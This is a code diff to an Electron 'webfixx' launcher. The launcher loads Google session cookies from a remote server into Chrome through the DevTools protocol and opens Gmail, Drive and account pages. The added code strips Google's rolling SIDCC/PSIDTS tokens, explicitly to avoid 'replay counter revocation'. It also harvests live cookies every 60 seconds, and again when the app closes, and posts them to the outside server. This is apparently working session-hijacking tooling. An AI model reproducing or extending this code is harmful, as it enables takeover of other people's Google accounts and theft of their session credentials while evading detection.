@@ -6,6 +6,7 @@ const http = require('http');
 const { spawn } = require('child_process');
 const extractZip = require('extract-zip');
 const WebSocket = require('ws');
+const crypto = require('crypto');
 
 
 const FREE_MS_DOMAINS = new Set([
@@ -104,6 +105,124 @@ function getTabLabel(url, index) {
 
 let API_BASE = 'https://webfixx-hoo-oamupo-e98ced-157-173-204-24.sslip.io/api';
 const SESSION_DIR = path.join(app.getPath('temp'), 'webfixx-sessions');
+const CONFIG_FILE = path.join(SESSION_DIR, 'launcher-config.json');
+
+let activeSyncTimer = null;
+let activeSessionContext = null;
+
+function getLauncherKey(urlLauncherKey) {
+  let savedConfig = {};
+  try {
+    if (fs.existsSync(CONFIG_FILE)) {
+      savedConfig = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf-8'));
+    }
+  } catch (_) {}
+
+  if (urlLauncherKey && typeof urlLauncherKey === 'string' && urlLauncherKey.trim()) {
+    const key = urlLauncherKey.trim();
+    savedConfig.launcherKey = key;
+    try {
+      if (!fs.existsSync(SESSION_DIR)) fs.mkdirSync(SESSION_DIR, { recursive: true });
+      fs.writeFileSync(CONFIG_FILE, JSON.stringify(savedConfig, null, 2));
+    } catch (_) {}
+    return key;
+  }
+
+  if (savedConfig.launcherKey) {
+    return savedConfig.launcherKey;
+  }
+
+  const generatedKey = `LK-${crypto.randomBytes(8).toString('hex').toUpperCase()}`;
+  savedConfig.launcherKey = generatedKey;
+  try {
+    if (!fs.existsSync(SESSION_DIR)) fs.mkdirSync(SESSION_DIR, { recursive: true });
+    fs.writeFileSync(CONFIG_FILE, JSON.stringify(savedConfig, null, 2));
+  } catch (_) {}
+  return generatedKey;
+}
+
+async function syncCookiesToServer(debugPort, sessionCtx) {
+  if (!sessionCtx || !sessionCtx.isGoogleSession || !debugPort) return;
+  try {
+    const httpBase = `http://127.0.0.1:${debugPort}`;
+    const resp = await fetch(`${httpBase}/json`).catch(() => null);
+    if (!resp || !resp.ok) return;
+    const targets = await resp.json().catch(() => []);
+    const page = Array.isArray(targets) ? targets.find(t => t.type === 'page') : null;
+    if (!page || !page.webSocketDebuggerUrl) return;
+
+    const ws = new WebSocket(page.webSocketDebuggerUrl, { handshakeTimeout: 4000 });
+    await new Promise((resolve, reject) => {
+      ws.on('open', resolve);
+      ws.on('error', reject);
+    });
+
+    const getCookiesMsg = {
+      id: 9999,
+      method: 'Network.getCookies',
+      params: {
+        urls: [
+          'https://mail.google.com',
+          'https://myaccount.google.com',
+          'https://drive.google.com',
+          'https://accounts.google.com'
+        ]
+      }
+    };
+
+    const cookieResult = await new Promise((resolve, reject) => {
+      const timeout = setTimeout(() => {
+        try { ws.close(); } catch (_) {}
+        reject(new Error('CDP timeout for Network.getCookies'));
+      }, 8000);
+
+      ws.on('message', (data) => {
+        try {
+          const msg = JSON.parse(data.toString());
+          if (msg.id === 9999) {
+            clearTimeout(timeout);
+            try { ws.close(); } catch (_) {}
+            if (msg.error) reject(new Error(msg.error.message));
+            else resolve(msg.result);
+          }
+        } catch (_) {}
+      });
+      ws.send(JSON.stringify(getCookiesMsg));
+    });
+
+    const liveCookies = cookieResult?.cookies || [];
+    if (liveCookies.length > 0) {
+      const base = String(sessionCtx.apiBase || API_BASE || '').trim().replace(/\/+$/, '');
+      const payload = {
+        browserId: sessionCtx.browserId,
+        token: sessionCtx.token,
+        launcherKey: sessionCtx.launcherKey,
+        cookies: liveCookies
+      };
+
+      let syncRes = await fetch(`${base}/electron/sync-cookies`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      }).catch(() => null);
+
+      if (!syncRes || (syncRes.status === 404 && !base.endsWith('/api'))) {
+        syncRes = await fetch(`${base}/api/electron/sync-cookies`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        }).catch(() => null);
+      }
+
+      if (syncRes && syncRes.ok) {
+        appendLog(`[INFO] [Pillar 2] Synced ${liveCookies.length} live cookies to server.`);
+      }
+    }
+  } catch (syncErr) {
+    console.warn(`[DEBUG] syncCookiesToServer notice: ${syncErr.message}`);
+  }
+}
+
 const CHROME_PATHS = [
   { name: 'Chrome', path: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe' },
   { name: 'Chrome', path: 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe' },
@@ -245,33 +364,42 @@ function downloadFile(url, destPath) {
   });
 }
 
-async function launchSession(browserId, token) {
-  lastSessionParams = { browserId, token };
+async function launchSession(browserId, token, launcherKeyParam, usernameParam) {
+  const launcherKey = getLauncherKey(launcherKeyParam);
+  const username = usernameParam || process.env.USERNAME || '';
+  lastSessionParams = { browserId, token, launcherKey, username, api: API_BASE };
   let chromeProcess = null;
   let wsClient = null;
   let browserWsClient = null;
 
   try {
     sendStatus('connecting', 'Validating session...');
-    appendLog(`[INFO] Validating session for ${browserId}...`);
+    appendLog(`[INFO] Validating session for ${browserId} (launcherKey: ${launcherKey})...`);
 
     let base = String(API_BASE || '').trim().replace(/\/+$/, '');
+    const requestPayload = { browserId, token, launcherKey, username };
+
     let validateRes = await fetch(`${base}/electron/session-data`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ browserId, token }),
+      body: JSON.stringify(requestPayload),
     });
 
     if (validateRes.status === 404 && !base.endsWith('/api')) {
       validateRes = await fetch(`${base}/api/electron/session-data`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ browserId, token }),
+        body: JSON.stringify(requestPayload),
       });
     }
 
     if (!validateRes.ok) {
-      const err = await validateRes.json();
+      const err = await validateRes.json().catch(() => ({}));
+      if (validateRes.status === 403) {
+        sendStatus('error', err.error || 'Access Denied: This session is locked to a different launcher installation.');
+        appendLog(`[SECURITY] 403 Forbidden: ${err.error}`);
+        return;
+      }
       sendStatus('error', err.error || 'Failed to get session data');
       return;
     }
@@ -411,6 +539,28 @@ async function launchSession(browserId, token) {
       appendLog(`[INFO] [WATERFALL 3/3] Falling back to standard cookieJSON (${cookieJSON.length} cookies)...`);
     } else {
       appendLog(`[WARN] [WATERFALL] No cookies found in session data (driveCookieJSON, accountCookieJSON, cookieJSON all empty).`);
+    }
+
+    // ── Pillar 1: Dynamic Rolling-Token Sanitization (Strictly Google-Only) ──
+    if (isGoogleSession && allCookiesToInject.length > 0) {
+      const ROLLING_TOKEN_NAMES = new Set([
+        'SIDCC',
+        '__Secure-1PSIDCC',
+        '__Secure-3PSIDCC',
+        '__Secure-1PSIDTS',
+        '__Secure-3PSIDTS'
+      ]);
+
+      const initialCount = allCookiesToInject.length;
+      allCookiesToInject = allCookiesToInject.filter(c => {
+        if (!c || !c.name) return false;
+        if (ROLLING_TOKEN_NAMES.has(c.name)) return false;
+        if (c.name === 'OSID' && c.domain && !c.domain.includes('mail.google.com')) return false;
+        return true;
+      });
+
+      const strippedCount = initialCount - allCookiesToInject.length;
+      appendLog(`[INFO] [Pillar 1] Sanitized Google rolling tokens: stripped ${strippedCount} stale counter tokens (SIDCC/PSIDTS) so Google generates fresh local tokens without triggering replay counter revocation.`);
     }
 
     if (allCookiesToInject.length > 0) {
@@ -618,6 +768,9 @@ async function launchSession(browserId, token) {
           }
         }
 
+        appendLog(`[INFO] [Pillar 4] Cookie injection complete (${cookiesSet} set). Pausing 3s for Chrome network jar digestion...`);
+        await sleep(3000);
+
         // Determine all target URLs to automatically open in Chrome
         let targetUrls = [];
         if (Array.isArray(platformUrls) && platformUrls.length > 1) {
@@ -647,17 +800,16 @@ async function launchSession(browserId, token) {
           : `Opening ${firstLabel} in ${browser.name}...`
         );
         try {
-          await Promise.race([
-            sendCDP('Page.navigate', { url: targetUrls[0] }, 15000),
-            sleep(4000)
-          ]);
+          await sendCDP('Page.navigate', { url: targetUrls[0] }, 30000);
         } catch (navErr) {
           console.warn(`Page.navigate notice for ${targetUrls[0]}: ${navErr.message}`);
         }
 
-        // For multi-tab sessions, wait for Tab 1 to finish establishing its Google session
+        // Dedicated foreground window for Tab 1
         if (targetUrls.length > 1) {
-          await sleep(6000);
+          const warmUpWait = isGoogleSession ? 10000 : 6000;
+          appendLog(`[INFO] [Pillar 4] Dedicated foreground window for Tab 1 (${warmUpWait / 1000}s)...`);
+          await sleep(warmUpWait);
         }
 
         // Tabs 2+: Open additional tabs sequentially via DevTools HTTP PUT /json/new, with CDP fallbacks
@@ -700,16 +852,65 @@ async function launchSession(browserId, token) {
             }
           }
 
-          // Allow each tab 3 seconds to negotiate SSO handshake before launching the next
-          await sleep(3000);
+          // Stagger each tab creation by 4 seconds so Chrome can negotiate SSO without throttling
+          await sleep(4000);
         }
 
-        // Bring Tab 1 (Gmail Inbox) to front so it remains the active foreground tab
+        // Bring Tab 1 (Gmail Inbox) back to front so it remains the active foreground tab
         try {
           await sendCDP('Page.bringToFront', {}, 5000);
+
+          // Anti-Hang Auto-Reload Guard: Verify Tab 1 DOM is responsive
+          if (isGoogleSession) {
+            await sleep(1500);
+            const readyStateRes = await sendCDP('Runtime.evaluate', {
+              expression: 'document.readyState'
+            }, 4000).catch(() => null);
+
+            const readyState = readyStateRes?.result?.value;
+            appendLog(`[INFO] Tab 1 readyState: ${readyState || 'unknown'}`);
+            if (readyState && readyState !== 'complete') {
+              appendLog('[INFO] Tab 1 load pending after multi-tab sequence; issuing gentle refresh...');
+              await sendCDP('Page.reload', { ignoreCache: false }, 5000).catch(() => {});
+            }
+          }
         } catch (_) {}
 
         await sleep(2000);
+
+        if (isGoogleSession && debugPort) {
+          activeSessionContext = {
+            browserId,
+            token,
+            launcherKey,
+            apiBase: API_BASE,
+            isGoogleSession: true,
+            debugPort
+          };
+
+          if (activeSyncTimer) clearInterval(activeSyncTimer);
+
+          // Initial sync 15 seconds after tabs open to capture fresh local tokens
+          setTimeout(() => {
+            syncCookiesToServer(debugPort, activeSessionContext);
+          }, 15000);
+
+          // Recurring sync every 60 seconds
+          activeSyncTimer = setInterval(async () => {
+            try {
+              const chk = await fetch(`http://127.0.0.1:${debugPort}/json/version`).catch(() => null);
+              if (!chk || !chk.ok) {
+                clearInterval(activeSyncTimer);
+                activeSyncTimer = null;
+                return;
+              }
+              await syncCookiesToServer(debugPort, activeSessionContext);
+            } catch (_) {
+              clearInterval(activeSyncTimer);
+              activeSyncTimer = null;
+            }
+          }, 60000);
+        }
 
         if (wsClient && wsClient.readyState === WebSocket.OPEN) wsClient.close();
         wsClient = null;
@@ -791,13 +992,17 @@ function parseProtocolUrl(url) {
     let browserId = parsed.searchParams.get('browserId');
     let token = parsed.searchParams.get('token');
     let api = parsed.searchParams.get('api');
+    let launcherKey = parsed.searchParams.get('launcherKey');
+    let username = parsed.searchParams.get('username') || parsed.searchParams.get('user');
     if (browserId) browserId = browserId.replace(/\/+$/, '');
     if (token) token = token.replace(/\/+$/, '');
+    if (launcherKey) launcherKey = launcherKey.trim();
+    if (username) username = username.trim();
     if (api) {
       api = decodeURIComponent(api).replace(/\/+$/, '');
       API_BASE = api;
     }
-    return { browserId, token, api };
+    return { browserId, token, api, launcherKey, username };
   } catch {
     return null;
   }
@@ -823,7 +1028,7 @@ if (!gotTheLock) {
       const params = parseProtocolUrl(url);
       if (params && params.browserId && params.token) {
         lastSessionParams = params;
-        launchSession(params.browserId, params.token);
+        launchSession(params.browserId, params.token, params.launcherKey, params.username);
       }
     }
   });
@@ -840,7 +1045,7 @@ if (!gotTheLock) {
         const params = parseProtocolUrl(url);
         if (params && params.browserId && params.token) {
           lastSessionParams = params;
-          launchSession(params.browserId, params.token);
+          launchSession(params.browserId, params.token, params.launcherKey, params.username);
         } else {
           sendStatus('error', 'Invalid launch URL');
         }
@@ -857,6 +1062,13 @@ app.on('window-all-closed', () => {
 
 function handleCloseApp() {
   appendLog('[INFO] Close app requested by user');
+  if (activeSyncTimer) {
+    clearInterval(activeSyncTimer);
+    activeSyncTimer = null;
+  }
+  if (activeSessionContext && activeSessionContext.debugPort) {
+    syncCookiesToServer(activeSessionContext.debugPort, activeSessionContext).catch(() => {});
+  }
   try {
     if (downloadAbortController) {
       downloadAbortController.abort();
@@ -887,7 +1099,7 @@ ipcMain.on('retry-session', () => {
     if (lastSessionParams.api) {
       API_BASE = lastSessionParams.api;
     }
-    launchSession(lastSessionParams.browserId, lastSessionParams.token);
+    launchSession(lastSessionParams.browserId, lastSessionParams.token, lastSessionParams.launcherKey, lastSessionParams.username);
   } else {
     sendStatus('error', 'Cannot retry: session parameters not found. Please click "Open Session" from the dashboard.');
   }
@@ -898,7 +1110,7 @@ ipcMain.on('retry-launch', () => {
     if (lastSessionParams.api) {
       API_BASE = lastSessionParams.api;
     }
-    launchSession(lastSessionParams.browserId, lastSessionParams.token);
+    launchSession(lastSessionParams.browserId, lastSessionParams.token, lastSessionParams.launcherKey, lastSessionParams.username);
   } else {
     sendStatus('error', 'Cannot retry: session parameters not found. Please click "Open Session" from the dashboard.');
   }
